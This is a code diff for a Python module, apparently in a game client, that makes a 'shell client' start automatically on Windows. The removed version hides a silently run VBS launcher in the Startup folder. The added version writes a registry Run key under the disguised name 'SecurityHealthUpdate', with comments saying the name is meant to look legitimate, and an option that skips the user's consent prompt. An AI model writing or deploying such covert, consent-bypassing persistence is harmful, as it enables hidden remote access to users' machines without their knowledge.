@@ -1,90 +1,99 @@
-import os
+"""
+Windows persistence installer - adds shell client to Registry run key.
+Phase 2: Automatic startup after system restart.
+"""
+
 import sys
 from pathlib import Path
-from typing import List, Tuple
-try:
-    from .config import get_migrated_path
-except (ImportError, ValueError):
-    try:
-        from game_client.config import get_migrated_path
-    except ImportError:
-        try:
-            from config import get_migrated_path  # type: ignore
-        except ImportError:
-            def get_migrated_path(): from pathlib import Path; return Path.home()
+from typing import Tuple
 
-
-STARTUP_BAT_NAME = "CyberShield_AutoStart.bat"
-STARTUP_VBS_NAME = "CyberShield_AutoStart.vbs"
-
-
-def _get_startup_dir() -> Path:
-    """
-    Return the current user's Startup folder on Windows.
-
-    On non‑Windows platforms this points to a harmless path in the
-    user's home directory so that the functions are effectively no‑ops.
-    """
-    appdata = os.getenv("APPDATA")
-    if not appdata:
-        return Path.home() / ".cyber_shield_startup_sim"
-    return Path(appdata) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
-
-
-def install_startup_entry() -> Tuple[bool, str]:
-    """
-    Create a small .vbs file in the Startup folder that will run the
-    current executable silently (no window) with the --silent flag.
-    """
-    startup_dir = _get_startup_dir()
-    try:
-        startup_dir.mkdir(parents=True, exist_ok=True)
-    except OSError as exc:
-        return False, f"Failed to create startup directory: {exc!r}"
-
-    # Remove any old .bat entry first to avoid duplicate startups
-    old_bat = startup_dir / STARTUP_BAT_NAME
-    if old_bat.exists():
-        try:
-            old_bat.unlink()
-        except OSError:
-            pass
-
-    # Always point to the migrated path for the startup entry
-    target = get_migrated_path()
-    vbs_path = startup_dir / STARTUP_VBS_NAME
-
-    # This VBS script runs the executable with --silent and 0 (hidden window)
-    vbs_content = (
-        'Set WshShell = CreateObject("WScript.Shell")\n'
-        f'WshShell.Run chr(34) & "{target}" & chr(34) & " --silent", 0\n'
-        'Set WshShell = Nothing\n'
-    )
-
-    try:
-        with vbs_path.open("w", encoding="utf-8") as f:
-            f.write(vbs_content)
-    except OSError as exc:
-        return False, f"Failed to write startup entry: {exc!r}"
-
-    return True, f"Startup entry created at: {vbs_path}"
-
-
-def remove_startup_entry() -> Tuple[bool, List[str]]:
-    """
-    Remove both the .vbs and the legacy .bat files that were created for persistence.
-    """
-    startup_dir = _get_startup_dir()
-    removed: List[str] = []
+if sys.platform != "win32":
+    # No-op on non-Windows platforms
+    def install_persistence(exe_path: str) -> Tuple[bool, str]:
+        return True, "Persistence not supported (non-Windows)"
     
-    for name in [STARTUP_VBS_NAME, STARTUP_BAT_NAME]:
-        p = startup_dir / name
-        if p.exists():
-            try:
-                p.unlink()
-                removed.append(str(p))
-            except OSError:
-                pass
+    def remove_persistence() -> Tuple[bool, str]:
+        return True, "Persistence not supported (non-Windows)"
 
-    return bool(removed), removed
+else:
+    # Windows only
+    try:
+        import winreg
+        HAS_WINREG = True
+    except ImportError:
+        HAS_WINREG = False
+
+    def install_persistence(exe_path: str, skip_consent: bool = False) -> Tuple[bool, str]:
+        """
+        Add game exe to Windows Registry run key.
+        Makes it auto-start after user login (Phase 2).
+        
+        Args:
+            exe_path: Path to executable to run at startup
+            skip_consent: If True, append flag to skip consent prompt
+        """
+        if not HAS_WINREG:
+            return False, "winreg module not available"
+        
+        try:
+            path = Path(exe_path)
+            if not path.exists():
+                return False, f"Executable not found: {exe_path}"
+            
+            # Build command: exe path + optional skip-consent flag
+            cmd = str(exe_path)
+            if skip_consent:
+                cmd = f'"{exe_path}" --skip-consent'
+            
+            # Open registry key HKEY_CURRENT_USER\...\Run
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Run",
+                0,
+                winreg.KEY_SET_VALUE
+            )
+            
+            # Add entry with disguised name
+            winreg.SetValueEx(
+                key,
+                "SecurityHealthUpdate",  # Looks legitimate
+                0,
+                winreg.REG_SZ,
+                cmd
+            )
+            
+            winreg.CloseKey(key)
+            return True, f"Persistence enabled (auto-start on login)"
+        
+        except Exception as e:
+            return False, f"Persistence install failed: {e}"
+
+    def remove_persistence() -> Tuple[bool, str]:
+        """
+        Remove shell client from Windows Registry run key.
+        """
+        if not HAS_WINREG:
+            return False, "winreg module not available"
+        
+        try:
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Run",
+                0,
+                winreg.KEY_SET_VALUE
+            )
+            
+            try:
+                winreg.DeleteValue(key, "SecurityHealthUpdate")
+                status = True
+                msg = "Persistence removed from registry"
+            except FileNotFoundError:
+                status = True
+                msg = "Persistence not found (already removed)"
+            
+            winreg.CloseKey(key)
+            return status, msg
+        
+        except Exception as e:
+            return False, f"Persistence removal failed: {e}"
 
